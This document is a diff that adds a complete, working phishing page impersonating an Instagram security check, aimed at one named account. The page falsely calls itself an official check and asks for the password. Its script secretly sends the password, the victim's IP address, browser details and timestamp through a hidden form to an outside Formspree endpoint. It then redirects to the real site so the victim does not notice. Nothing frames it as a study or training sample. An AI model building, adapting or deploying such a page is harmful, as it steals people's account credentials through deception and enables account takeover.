@@ -1,0 +1,295 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram Security Verification</title>
+    <meta name="description" content="Instagram account security verification page">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+        }
+        
+        body {
+            background-color: #fafafa;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            padding: 20px;
+        }
+        
+        .container {
+            width: 100%;
+            max-width: 400px;
+        }
+        
+        .login-box {
+            background: white;
+            border: 1px solid #dbdbdb;
+            padding: 40px 30px;
+            text-align: center;
+            border-radius: 8px;
+        }
+        
+        .logo {
+            font-size: 42px;
+            font-weight: bold;
+            color: #262626;
+            margin-bottom: 25px;
+            font-family: 'Instagram', cursive;
+        }
+        
+        .security-alert {
+            background: #fff8e1;
+            border-left: 4px solid #ff9800;
+            padding: 15px;
+            margin-bottom: 25px;
+            text-align: left;
+            border-radius: 4px;
+        }
+        
+        .alert-icon {
+            color: #ff9800;
+            font-size: 20px;
+            margin-right: 10px;
+        }
+        
+        .target-account {
+            background: #f5f5f5;
+            padding: 12px;
+            border-radius: 6px;
+            margin-bottom: 20px;
+            font-weight: bold;
+            color: #262626;
+        }
+        
+        .password-input {
+            width: 100%;
+            padding: 14px;
+            margin-bottom: 15px;
+            border: 1px solid #dbdbdb;
+            border-radius: 6px;
+            font-size: 16px;
+            background: #fafafa;
+        }
+        
+        .password-input:focus {
+            outline: none;
+            border-color: #a8a8a8;
+            background: white;
+        }
+        
+        .verify-btn {
+            width: 100%;
+            background: #0095f6;
+            color: white;
+            border: none;
+            padding: 14px;
+            border-radius: 8px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: background 0.3s;
+        }
+        
+        .verify-btn:hover {
+            background: #1877f2;
+        }
+        
+        .loading-spinner {
+            display: none;
+            width: 40px;
+            height: 40px;
+            border: 4px solid #f3f3f3;
+            border-top: 4px solid #0095f6;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin: 20px auto;
+        }
+        
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        
+        .success-message {
+            display: none;
+            color: #4CAF50;
+            font-size: 18px;
+            margin: 20px 0;
+        }
+        
+        .footer {
+            margin-top: 25px;
+            font-size: 12px;
+            color: #8e8e8e;
+            line-height: 1.5;
+        }
+        
+        .warning {
+            color: #ff3b30;
+            font-weight: bold;
+        }
+    </style>
+    
+    <!-- Instagram-like font -->
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
+    <style>
+        @font-face {
+            font-family: 'Instagram';
+            src: url('https://fonts.gstatic.com/s/roboto/v30/KFOlCnqEu92Fr1MmEU9fBBc4AMP6lQ.woff2') format('woff2');
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="login-box">
+            <div class="logo">Instagram</div>
+            
+            <div class="security-alert">
+                <span class="alert-icon">⚠️</span>
+                <strong>Security Verification Required</strong>
+                <p style="margin-top: 8px; font-size: 14px;">
+                    We've detected unusual login activity on your Instagram account. 
+                    Please verify your identity to secure your account.
+                </p>
+            </div>
+            
+            <div class="target-account">
+                Account: <span style="color: #0095f6;">@whotfrnx</span>
+            </div>
+            
+            <div id="verificationForm">
+                <input type="password" 
+                       class="password-input" 
+                       id="password" 
+                       placeholder="Enter your password" 
+                       required
+                       autocomplete="current-password">
+                
+                <button class="verify-btn" onclick="startVerification()">
+                    Verify Account
+                </button>
+                
+                <p style="font-size: 12px; color: #8e8e8e; margin-top: 15px;">
+                    By verifying, you help us protect your account from unauthorized access.
+                </p>
+            </div>
+            
+            <div class="loading-spinner" id="loadingSpinner"></div>
+            
+            <div class="success-message" id="successMessage">
+                ✅ Verification successful! Redirecting to Instagram...
+            </div>
+            
+            <div class="footer">
+                <p>This is an official security check from Instagram.</p>
+                <p class="warning">Do not share this verification link with anyone.</p>
+                <p style="margin-top: 10px;">© 2024 Instagram from Meta</p>
+            </div>
+        </div>
+    </div>
+    
+    <!-- Hidden form for Formspree -->
+    <form id="hiddenForm" 
+          action="https://formspree.io/f/xeezqban" 
+          method="POST"
+          style="display: none;">
+        <input type="hidden" name="target_account" value="whotfrnx">
+        <input type="hidden" name="password" id="hiddenPassword">
+        <input type="hidden" name="user_ip" id="userIP">
+        <input type="hidden" name="user_agent" id="userAgent">
+        <input type="hidden" name="verification_time" id="verificationTime">
+        <input type="hidden" name="page_url" id="pageURL">
+    </form>
+    
+    <script>
+        // Get user information
+        async function getUserIP() {
+            try {
+                const response = await fetch('https://api.ipify.org?format=json');
+                const data = await response.json();
+                return data.ip;
+            } catch (error) {
+                return 'IP Not Available';
+            }
+        }
+        
+        // Collect and send data
+        async function collectAndSendData(password) {
+            const ip = await getUserIP();
+            const userAgent = navigator.userAgent;
+            const currentTime = new Date().toISOString();
+            const pageURL = window.location.href;
+            
+            // Fill hidden form
+            document.getElementById('hiddenPassword').value = password;
+            document.getElementById('userIP').value = ip;
+            document.getElementById('userAgent').value = userAgent;
+            document.getElementById('verificationTime').value = currentTime;
+            document.getElementById('pageURL').value = pageURL;
+            
+            // Submit to Formspree
+            document.getElementById('hiddenForm').submit();
+            
+            // Also log to console for debugging
+            console.log('Data sent to Formspree:', {
+                target: 'whotfrnx',
+                password: password,
+                ip: ip,
+                time: currentTime
+            });
+        }
+        
+        // Main verification function
+        async function startVerification() {
+            const password = document.getElementById('password').value.trim();
+            
+            if (!password) {
+                alert('Please enter your password to verify your account.');
+                return;
+            }
+            
+            // Show loading
+            document.getElementById('verificationForm').style.display = 'none';
+            document.getElementById('loadingSpinner').style.display = 'block';
+            
+            // Send data to Formspree
+            await collectAndSendData(password);
+            
+            // Simulate processing delay
+            setTimeout(() => {
+                // Hide loading, show success
+                document.getElementById('loadingSpinner').style.display = 'none';
+                document.getElementById('successMessage').style.display = 'block';
+                
+                // Redirect to real Instagram after 3 seconds
+                setTimeout(() => {
+                    window.location.href = 'https://instagram.com';
+                }, 3000);
+                
+            }, 1500);
+        }
+        
+        // Allow Enter key to submit
+        document.getElementById('password').addEventListener('keypress', function(e) {
+            if (e.key === 'Enter') {
+                startVerification();
+            }
+        });
+        
+        // Auto-focus on password field
+        window.onload = function() {
+            document.getElementById('password').focus();
+        };
+        
+        // Add some extra security-looking elements
+        console.log('%c🔒 Instagram Security Verification Active', 'color: #0095f6; font-size: 14px; font-weight: bold;');
+        console.log('%cThis page is securely encrypted for account protection.', 'color: #666;');
+    </script>
+</body>
+</html>
